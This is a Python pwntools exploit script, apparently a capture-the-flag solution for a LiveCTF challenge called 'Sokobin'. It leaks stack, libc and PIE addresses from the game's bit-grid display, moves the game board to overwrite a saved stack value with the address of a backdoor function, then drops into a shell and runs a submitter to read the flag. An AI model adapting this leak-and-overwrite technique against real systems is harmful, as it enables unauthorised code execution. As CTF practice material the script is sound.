#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# context.terminal = ['tmux', 'splitw', '-h']
# s = remote('172.17.0.2',44444)
s = None
def parse_bin(pic):
    # . means 0
    # o means 1
    pic = pic[::-1]
    tmp = ''
    for c in pic:
        if chr(c) == '.' or chr(c) == '@':
            tmp += '0'
        else:
            tmp += '1'
    return tmp

def parse_bin_to_int(bin):
    tmp = parse_bin(bin)
    return int(tmp, 2)

def int_bin_num(num):
    lines = bin(num)[2:].zfill(64)
    line1 = lines[:32][::-1].replace('0', '.').replace('1', 'o').encode()
    line2 = lines[32:][::-1].replace('0', '.').replace('1', 'o').encode()
    return [line1 , line2]

def recv_maps():
    global s
    s.recvuntil(b"Sokobin!\n")
    maps = []
    lines = []
    for i in range(32):
        line = s.recvline().strip()
        lines.append(line)
        if i % 2 == 0:
            maps.append(parse_bin_to_int(line))
        else:
            maps[-1] = maps[-1] << 32 | parse_bin_to_int(line)
    return maps, lines

def step(steps):
    global s
    for c in steps:
        # recv_maps()
        # s.recvuntil(b"Sokobin!\n")
        s.sendline(chr(c).encode('latin-1'))

UP = b'w'
DOWN = b'r'
LEFT = b'a'
RIGHT = b's'

    # gdb.attach(s)
def exp():
    global s
    global now_len_rel,now_len
    s = remote(HOST, int(PORT))
    stack_maps, _ = recv_maps()
    stack_state_addr = stack_maps[-2]
    libc_base = stack_maps[-6] - 0x2a1ca
    pie = stack_maps[6] - 0x1274 

    success(f"stack_state_addr: {hex(stack_state_addr)}")
    success(f"libc_base: {hex(libc_base)}")
    success(f"pie: {hex(pie)}")

    s.sendline(RIGHT)

    payload = RIGHT * 31 + UP * 7
    # for i in range(16):
    pattern = UP * 5 + DOWN * 5 + LEFT * 2
    payload += pattern * 16
    step(payload)

    _, orid_lines = recv_maps()
    s.sendline(b'g')
    orid_map = orid_lines[0x14:0x18]
    orid_map_cnts = 0
    for i in range(len(orid_map)):
        orid_map_cnts += orid_map[i].count(b'o')
        # print(hex(i),orid_map[i])

    backdoor = pie + 0x1250
    target_lines = int_bin_num(backdoor)
    target_map_cnts = 0
    for i in range(len(target_lines)):
        target_map_cnts += target_lines[i].count(b'o')
        # print(hex(i),target_lines[i])

    target_map = pie+0x1250
    ori_map = stack_maps[-6]
    # print(bin(ori_map).count('1'),bin(target_map).count('1'))

    # clear map
    step(b'w' + b's' * 32 + b'a' * 32)
    step(b'w' + b's' * 32 + b'a' * 32)
    step(b'w' + b's' * 32 + b'a' * 32)
    step(b'w' + b's' * 32 + b'a' * 32)
    for i in range(32):
        step(b'wwwwwrrrrrs')
    step(b'a' * 32)
    step(b'rrrr')
    for i in range(31):
        step(b'swwwwrrrr')
    step(b'w' * 9 +b'a' * 32 + b'r' * 5 +b's' * 32 + b'w')
    s.clean()
    s.sendline(b'\n')
    _,now_map = recv_maps()
    now_map = [parse_bin_to_int(line) for line in now_map]
    # print(now_map)
    all_line = now_map[-16].bit_count() + now_map[-13].bit_count() + now_map[-14].bit_count()+now_map[-15].bit_count()
    # print(all_line)
    # print(hex(target_map))
    assert(all_line >= target_map.bit_count())
    need_low = target_map & 0xffffffff
    need_high = (target_map >> 32) & 0xffffffff


    now_len = -13
    now_len_rel = now_map[-13].bit_count()
    def get_one_to(pos,high):
        global now_len_rel,now_len
        if now_len_rel == 0:
            now_len -= 1
            now_len_rel = now_map[now_len].bit_count()
        need_l = 32 - now_len_rel - pos -1
        if need_l < 0:
            print('nonon')
        else:
            need_h = (-13 - now_len)
            s_pre = b'' + b'w' * need_h
            step(s_pre + b'a' * need_l+ b's' * need_l + b'r' * need_h)
            # print(s.clean().decode())
            # input("")
            if now_len == -13:
                step(b'w' * 4 + b'a' * 32 + b'r'  + b'a' * 10 + b's'*(pos) + b'rr')
            else:
                step(b'a' * 32 + b'w' * (need_h+1)+ b's'*(pos))
            # print(s.clean().decode())
            # input("")
            need_down = b'r' * (high + need_h + 1) +  b'w' * (high + need_h)
            step(need_down)
            step(b's' * need_l + b'r' * need_h)
            # print(s.clean().decode())
            # input("")
            step(b'a' *32 + b'www' + b's' * 10 + b'w' + b's' * 22 + b'r' * 4)
            # print(s.clean().decode())
            # input("")
        now_len_rel -= 1


    print(hex(need_low),hex(need_high))
    for i in range(32):
        now_need_low = ((need_low >> i) & 1)
        if now_need_low == 1:
            get_one_to(i,1)
        now_need_high = ((need_high >> i) & 1)
        if now_need_high == 1:
            get_one_to(i,0)
        # input(f"round {i}")
    script = '''
        b *$rebase(0x1A88)
        c
    '''
    # gdb.attach(s, script)
    # pause()
    s.sendline("q")
    s.sendline("echo fuck")
    s.recvuntil("fuck")
    s.sendline("./submitter")
    flag = s.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)
    exit(0)
while True:
    try:
        exp()
    except Exception as e:
        continue